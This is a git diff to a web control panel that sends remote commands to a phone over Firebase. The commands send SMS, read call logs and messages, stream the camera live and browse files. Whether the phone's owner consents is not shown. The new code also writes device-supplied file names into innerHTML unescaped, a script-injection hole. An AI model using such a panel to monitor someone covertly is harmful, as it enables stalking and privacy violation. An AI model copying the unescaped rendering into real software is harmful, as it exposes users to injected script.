@@ -428,6 +428,61 @@ function setupCommandButtons() {
             alert('Please enter a URL');
         }
     });
+    
+    // Send SMS
+    document.getElementById('btnSendSms')?.addEventListener('click', () => {
+        const modal = new bootstrap.Modal(document.getElementById('smsModal'));
+        modal.show();
+    });
+    
+    // Send SMS Submit
+    document.getElementById('btnSendSmsSubmit')?.addEventListener('click', () => {
+        const phoneNumber = document.getElementById('smsPhoneNumber').value.trim();
+        const message = document.getElementById('smsMessage').value.trim();
+        
+        if (phoneNumber && message) {
+            sendCommand('send_sms', { phoneNumber, message });
+            bootstrap.Modal.getInstance(document.getElementById('smsModal')).hide();
+            document.getElementById('smsPhoneNumber').value = '';
+            document.getElementById('smsMessage').value = '';
+        } else {
+            alert('Please enter phone number and message');
+        }
+    });
+    
+    // Get Call Logs
+    document.getElementById('btnGetCallLogs')?.addEventListener('click', () => {
+        sendCommand('get_call_logs', { limit: 20 });
+    });
+    
+    // Get SMS Messages
+    document.getElementById('btnGetSms')?.addEventListener('click', () => {
+        sendCommand('get_sms_messages', { limit: 20 });
+    });
+    
+    // Get Battery Info
+    document.getElementById('btnBatteryInfo')?.addEventListener('click', () => {
+        sendCommand('get_battery_info', {});
+    });
+    
+    // Camera Stream
+    document.getElementById('btnCameraStream')?.addEventListener('click', () => {
+        const camera = confirm('Use Front camera? (Cancel for Back camera)') ? 'front' : 'back';
+        startCameraStream(camera);
+    });
+    
+    // Stop Stream
+    document.getElementById('btnStopStream')?.addEventListener('click', () => {
+        stopCameraStream();
+    });
+    
+    // File Manager
+    document.getElementById('btnFileManager')?.addEventListener('click', () => {
+        const path = prompt('Enter path to list files:', '/sdcard/DCIM');
+        if (path) {
+            sendCommand('list_files', { path });
+        }
+    });
 }
 
 async function sendCommand(type, data) {
@@ -502,8 +557,18 @@ function showCommandResult(result) {
     const resultEl = document.getElementById('commandResult');
     const resultText = document.getElementById('commandResultText');
     
+    // Special handling for images (take_photo, download_file with image)
+    if (result.image) {
+        const { image, ...rest } = result;
+        let output = '<div class="mb-3">';
+        output += `<img src="data:image/jpeg;base64,${image}" class="img-fluid rounded" style="max-width:100%;max-height:400px;"><br>`;
+        output += `<small class="text-muted">Image captured (${rest.size} bytes)</small>`;
+        output += '</div>';
+        output += `<pre>${JSON.stringify(rest, null, 2)}</pre>`;
+        resultText.innerHTML = output;
+    }
     // Special handling for location result with maps link
-    if (result.mapsUrl) {
+    else if (result.mapsUrl) {
         const { mapsUrl, ...rest } = result;
         
         // Create formatted output
@@ -514,11 +579,104 @@ function showCommandResult(result) {
         output += `  "mapsUrl": `;
         
         resultText.innerHTML = output + `<a href="${mapsUrl}" target="_blank" class="text-primary text-decoration-underline">${mapsUrl}</a>\n}`;
-    } else {
+    }
+    // Special handling for file lists
+    else if (result.files && Array.isArray(result.files)) {
+        let output = `<div class="mb-2"><strong>Path:</strong> ${result.path}</div>`;
+        output += `<div class="mb-2"><strong>Files:</strong> ${result.count}</div>`;
+        output += '<div class="list-group">';
+        result.files.forEach(file => {
+            const icon = file.isDirectory ? '📁' : '📄';
+            const size = file.isDirectory ? '' : ` (${formatFileSize(file.size)})`;
+            output += `<div class="list-group-item">${icon} <strong>${file.name}</strong>${size}</div>`;
+        });
+        output += '</div>';
+        resultText.innerHTML = output;
+    }
+    else {
         resultText.textContent = JSON.stringify(result, null, 2);
     }
     
     resultEl.classList.remove('d-none');
+}
+
+function formatFileSize(bytes) {
+    if (bytes < 1024) return bytes + ' B';
+    if (bytes < 1024 * 1024) return (bytes / 1024).toFixed(1) + ' KB';
+    if (bytes < 1024 * 1024 * 1024) return (bytes / (1024 * 1024)).toFixed(1) + ' MB';
+    return (bytes / (1024 * 1024 * 1024)).toFixed(1) + ' GB';
+}
+
+// ========== CAMERA STREAMING ==========
+
+let cameraStreamListener = null;
+
+async function startCameraStream(camera) {
+    if (!currentUserId) {
+        alert('Not logged in');
+        return;
+    }
+    
+    showCommandStatus(`Starting ${camera} camera stream...`);
+    
+    try {
+        // Send start command
+        await sendCommand('start_camera_stream', { camera });
+        
+        // Show stream card
+        document.getElementById('cameraStreamCard').classList.remove('d-none');
+        
+        // Listen to Firebase Realtime Database for frames
+        const database = firebase.database();
+        const streamRef = database.ref(`camera_streams/${currentUserId}`);
+        
+        cameraStreamListener = streamRef.on('value', (snapshot) => {
+            const data = snapshot.val();
+            if (data && data.frame && data.active) {
+                // Update image
+                document.getElementById('cameraStreamImage').src = `data:image/jpeg;base64,${data.frame}`;
+                
+                // Update info
+                const timestamp = new Date(data.timestamp).toLocaleTimeString();
+                document.getElementById('streamInfo').textContent = 
+                    `Frame ${data.frameNumber} | ${data.camera} camera | ${timestamp}`;
+            } else if (data && !data.active) {
+                // Stream stopped
+                stopCameraStream();
+            }
+        });
+        
+        showCommandStatus(`Camera stream active (${camera})`, 'success');
+        
+    } catch (error) {
+        console.error('Start camera stream error:', error);
+        showCommandStatus(`Failed to start stream: ${error.message}`, 'danger');
+    }
+}
+
+async function stopCameraStream() {
+    if (!currentUserId) return;
+    
+    try {
+        // Stop listening
+        if (cameraStreamListener) {
+            const database = firebase.database();
+            database.ref(`camera_streams/${currentUserId}`).off('value', cameraStreamListener);
+            cameraStreamListener = null;
+        }
+        
+        // Send stop command
+        await sendCommand('stop_camera_stream', {});
+        
+        // Hide stream card
+        document.getElementById('cameraStreamCard').classList.add('d-none');
+        document.getElementById('cameraStreamImage').src = '';
+        
+        showCommandStatus('Camera stream stopped', 'info');
+        
+    } catch (error) {
+        console.error('Stop camera stream error:', error);
+    }
 }
 
 function hideCommandResult() {
